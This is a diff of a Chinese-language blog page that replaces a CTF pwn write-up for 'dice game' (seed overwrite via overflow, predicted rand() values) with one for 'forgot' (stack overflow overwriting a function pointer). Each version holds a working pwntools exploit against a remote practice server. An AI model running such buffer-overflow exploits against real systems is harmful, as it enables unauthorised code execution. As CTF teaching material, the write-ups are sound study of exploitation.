@@ -81,23 +81,22 @@
 
 
 
-<meta name="description" content="0x01 寻找漏洞123题目考察的是：rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。ida分析   1buf覆盖0x40位就能覆盖到seed   1sub_A20()如下，就是比较你输入的数是否和产生的随机数相等   1当回答正确50次时，会执行sub_B28这个函数，读取flag。   0x02">
+<meta name="description" content="0x01 寻找漏洞1234567891011xfgg@ubuntu:~/Downloads$ checksec forgot[*] &apos;/home/xfgg/Downloads/forgot&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enab">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dice game">
-<meta property="og:url" content="http://yoursite.com/2019/07/27/dice game/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/07/27/forgot/index.html">
 <meta property="og:site_name" content="xfgg">
-<meta property="og:description" content="0x01 寻找漏洞123题目考察的是：rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。ida分析   1buf覆盖0x40位就能覆盖到seed   1sub_A20()如下，就是比较你输入的数是否和产生的随机数相等   1当回答正确50次时，会执行sub_B28这个函数，读取flag。   0x02">
+<meta property="og:description" content="0x01 寻找漏洞1234567891011xfgg@ubuntu:~/Downloads$ checksec forgot[*] &apos;/home/xfgg/Downloads/forgot&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enab">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190508145639641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019050814583223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019050814592433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190508150044523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70">
-<meta property="og:updated_time" content="2019-07-27T10:50:32.062Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2019-07-27T11:09:30.760Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="dice game">
-<meta name="twitter:description" content="0x01 寻找漏洞123题目考察的是：rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。ida分析   1buf覆盖0x40位就能覆盖到seed   1sub_A20()如下，就是比较你输入的数是否和产生的随机数相等   1当回答正确50次时，会执行sub_B28这个函数，读取flag。   0x02">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190508145639641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70">
+<meta name="twitter:description" content="0x01 寻找漏洞1234567891011xfgg@ubuntu:~/Downloads$ checksec forgot[*] &apos;/home/xfgg/Downloads/forgot&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enab">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70">
 
 
 
@@ -127,7 +126,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/27/dice game/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/27/forgot/">
 
 
 
@@ -260,7 +259,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/dice game/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/forgot/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -289,7 +288,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T15:43:54+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:02:27+08:00">
                 2019-07-27
               </time>
             
@@ -349,21 +348,20 @@
       
 
       
-        <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目考察的是：rand()生成的随机数和随机种子seed()有关，通过观察题目，可以发现存在溢出漏洞，通过输入可以覆盖到seed(),实现一个可预测的随机数列。</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure>
+        <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec forgot</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/forgot'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190508145639641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf覆盖0x40位就能覆盖到seed</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现有两处溢出点</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2019050814583223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_A20()如下，就是比较你输入的数是否和产生的随机数相等</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以观察到箭头处是个函数指针，&amp;v3 是v3在栈上的地址，&amp;v3 + --v14 是根据&amp;v3在栈上移动，上面的<span class="keyword">for</span>循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2019050814592433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当回答正确50次时，会执行sub_B28这个函数，读取flag。</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现目标函数</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190508150044523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDI5MDgx,size_16,color_FFFFFF,t_70" alt></p>
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以我们要做的就是，将seed覆盖掉，并且去预测生成的随机数。</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span><br><span class="line">v12，随后cat flag</span><br></pre></td></tr></table></figure>
 
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,56942)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asm =[2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*0x40 + p64(0)</span><br><span class="line">p.recvuntil(<span class="string">"know your name: "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> asm:</span><br><span class="line">        p.recvuntil(<span class="string">"Give me the point(1~6): "</span>)</span><br><span class="line">        p.send(str(x) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 产生随机数的脚本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt; </span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">  srand(0);  <span class="comment">##切记一定是0 ，第一次尝试错误了  没有将种子设置为0</span></span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;50;i++)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,"</span>,rand()%6 +1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,39675)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x44 + p32(0x080486CC) + <span class="string">'a'</span>*0x20 + p32(0x8)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &amp;v3+ --v14 便会指向</span></span><br><span class="line"><span class="comment">#v12，随后cat flag</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"bbb"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -393,8 +391,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/27/int_overflow/" rel="next" title="int_overflow">
-                <i class="fa fa-chevron-left"></i> int_overflow
+              <a href="/2019/07/27/warmup/" rel="next" title="warm up">
+                <i class="fa fa-chevron-left"></i> warm up
               </a>
             
           </div>
@@ -402,10 +400,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/27/warmup/" rel="prev" title="warm up">
-                warm up <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
